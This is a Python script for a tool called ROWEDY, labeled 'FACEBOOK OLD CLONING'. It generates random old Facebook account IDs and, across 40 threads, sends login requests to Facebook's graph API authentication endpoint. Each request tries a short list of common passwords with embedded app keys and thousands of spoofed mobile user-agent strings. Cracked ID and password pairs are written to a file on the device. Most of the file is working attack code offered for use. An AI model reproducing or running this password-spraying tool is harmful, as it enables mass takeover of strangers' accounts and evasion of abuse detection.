'GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
	ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
	memekk = random.choice([ugent1, ugent2, ugent3])
	ugen.append(memekk)
for xffd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for t in range(10000):
	aa='Mozilla/5.0 (Linux; Android 7.0; '
	b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
	c='Hisense F102) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
#---------------------[ COLOUR ]---------------------#
green="\033[1;32m";white="\x1b[1;97m";red="\x1b[38;5;160m";cyan="\033[1;36m" 
W = '\033[1;37m'  # White
G = '\033[1;32m'  # Green
R = '\033[1;31m'  # Red
Y = '\033[1;33m'  # Yellow
C = '\033[1;36m'  # Cyan
N = '\033[0m'     # Reset
#---------------------[ STYLE ]---------------------#
xd = f"{white}[{green}={white}]";xd1=f"{white}[{green}1{white}]";xd2=f"{white}[{green}2{white}]";xd0=f"{white}[{green}0{white}]";xdx=f"{white}[{green}?{white}]"
#---------------------[ CLEAR ]---------------------#
def clear():os.system('clear');print(logo)
def linex():print(f"{white}{47*'-'}")
#---------------------[ STYLE ]---------------------#
xd = f"{white}[{green}={white}]"
xd1 = f"{white}[{green}1{white}]"
xd2 = f"{white}[{green}2{white}]"
#---------------------[ CLEAR ]---------------------#
def clear():os.system('clear');print(logo)
def linex():
    print(f"{white}{47*'-'}")
#____________________[ CLEAR ]____________________#

os.system("clear")

#-----RUN YOUR WELCOME MESSAGE FIRST------#

import time
import sys
import os

def slow_print(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

slow_print("JAI MAHAKAL ❤️")
os.system("espeak 'JAI SHREE RAM'")
slow_print("WELCOME TO THE ROWEDY TOOLS")
os.system("espeak 'WELCOME TO THE ROWEDY TOOL'")
slow_print("Join whatsapp group for password")
os.system("espeak 'join whatsapp group for password'")
os.system("xdg-open 'https://wa.me/918290090930'")
#---------------------[ LOGO ]---------------------#
logo = f'''\n      {cyan}
   /$$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$  /$$     /$$
| $$__  $$ /$$__  $$| $$  /$ | $$| $$__  $$|  $$   /$$/
| $$  \ $$| $$  \ $$| $$ /$$$| $$| $$  \ $$ \  $$ /$$/ 
| $$$$$$$/| $$  | $$| $$/$$ $$ $$| $$  | $$  \  $$$$/  
| $$__  $$| $$  | $$| $$$$_  $$$$| $$  | $$   \  $$/   
| $$  \ $$| $$  | $$| $$$/ \  $$$| $$  | $$    | $$    
| $$  | $$|  $$$$$$/| $$/   \  $$| $$$$$$$/    | $$    
|__/  |__/ \______/ |__/     \__/|_______/     |__/    
                                                       
                                                       
                                                       
    EDITOR (राजस्थान सरकार)

{C}─────────────────────────────────────────────
{C}| {G}OWNER   {W}: ROWEDY ✅  {W}ROWEDY EDITOR
{C}| {G}GITHUB  {W}: rowedy
{C}| {G}VERSION {W}: 1.0
{C}| {G}TOOLS   {W}: FACEBOOK OLD CLONING
{C}| {G}STATUS  {W}: PERSONAL
{C}─────────────────────────────────────────────'''

#______________[ NOW ASK PASSWORD BELOW LOGO ]______________________#

import os
import getpass

correct_password = "ROWEDYKING"

GREEN = "\033[92m"
RESET = "\033[0m"

# Ask for password (hidden typing)
user_input = input(f"{GREEN}Enter tool password: {RESET}")

if user_input == correct_password:
    os.system("espeak 'Successful login to tool'")
    print(f"{GREEN}Welcome to your tool!{RESET}")
else:
    os.system("espeak 'Access denied'")
    print(f"{RESET}Access Denied")
    exit()

#---------------------[ MAIN MENU ]---------------------#
def ____main_____():
	clear();print(f"{xd1} START OLD UID CRACK ");print(f"{xd0} EXIT OLD UID CRACK ");linex();___option___=input(f'{xdx} SELECTED : ')
	if ___option___ in ['1']:os.system('xdg-open https://www.facebook.com/profile.php?id=100007954243096');_____OLD_____()
	else:exit(f'{xd} WRONG OPTION SELECTED BROH.....! ')

#---------------------[ OLD UID MENU ]---------------------#
def _____OLD_____():
	clear();os.system('xdg-open https://www.facebook.com/groups/652859211233045/?ref=share&mibextid=WaXdOe');print(f'{xd} EXAMPLE : 5555 | 7777 | 9999 | 99999 ');linex();limit = int(input(f'{xdx} ENTER CRACK LIMIT : '))
	___pot___ = "10000"
	for ixx in range(int(limit)):khalifa=str(random.choice(range(1000000000,1999999999)));user.append(khalifa)
	with ThreadPool(max_workers=40) as ____iloveyou____:
		clear();tl=str(len(user))
		print(f'{xd} TOTAL CRACK LIMIT :{green} {tl} ');print(f'{xd} YOUR CRACK STARTED........ ');linex()
		for lover in user:
			ids = ___pot___+lover
			passlist = ["123456","1234567","12345678","123456789","123123","143143"]
			____iloveyou____.submit(_____method_____,ids,passlist)
	linex();print(f"{white}{47*'-'}");print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK UID :{green} ' + str(len(oks)));print(f"{white}{47*'-'}");exit()
#---------------------[ OLD METHOD ]---------------------#
def _____method_____(ids,passlist):
    global loop,oks
    sys.stdout.write(f'\r\r\033[1;37m[ROWEDY-XD] %s|\033[1;32mOK:-%s '%(loop,len(oks)));sys.stdout.flush()
    _____mrpoco_____ = random.choice(ugen)
    try:
        for pas in passlist:
            data = {'adid':str(uuid.uuid4()),'email':ids,'password':pas,'cpl':'true','credentials_type':'device_based_login_password',"source": "device_based_login",'error_detail_type':'button_with_disabled','format':'json','generate_session_cookies':'1','generate_analytics_claim':'1','generate_machine_id':'1',"family_device_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),"locale":"en_US","client_country_code":"US","device_id": str(uuid.uuid4()),"method": "auth.login","api_key": "882a8490361da98702bf97a021ddc14d","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"};head = {'content-type':'application/x-www-form-urlencoded','Host': 'graph.facebook.com','x-fb-sim-hni':str(random.randint(20000,40000)),'X-FB-Connection-Type': 'WIFI','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent':_____mrpoco_____,'x-fb-net-hni':str(random.randint(20000,40000)),'x-fb-device-group': '5120','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-connection-bandwidth':str(random.randint(20000000,30000000)),'x-fb-connection-quality':'EXCELLENT','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','x-fb-friendly-name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','accept-encoding':'gzip, deflate','x-fb-http-engine':'Liger'};url = "https://graph.facebook.com/auth/login"
            response = requests.post(url,data=data,headers=head,verify=True).json()
            if "access_token" in response:
                print('\r\r\033[1;32m[ROWEDY-XD-OK] '+ids+' | '+pas+'\033[1;97m')
                open("/sdcard/ROWEDY-XD-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                oks.append(ids)
                break
            elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                print('\r\r\033[1;32m[ROWEDY-XD-OK] '+ids+' | '+pas+'\033[1;97m')
                open("/sdcard/ROWEDY-XD-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                oks.append(ids)
                break
            else:continue
        loop += 1
    except Exception as e:pass
#---------------------[ IMPORT ]---------------------#
if __name__ == "__main__":

	____main_____()
